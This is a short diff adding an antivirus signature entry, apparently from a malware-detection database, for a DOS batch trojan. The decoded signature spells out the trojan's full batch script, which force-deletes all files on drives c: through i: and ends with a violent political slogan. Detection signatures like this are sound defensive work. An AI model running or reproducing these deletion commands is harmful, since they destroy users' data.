@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36622
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off del /f /s /q i:\*.* del /f /s /q h:\*.* del /f /s /q g:\*.* del /f /s /q f:\*.* del /f /s /q e:\*.* del /f /s /q d:\*.* del /f /s /q c:\program files\*.* del /f /s /q c:\*.* kill george w bush ! not war !
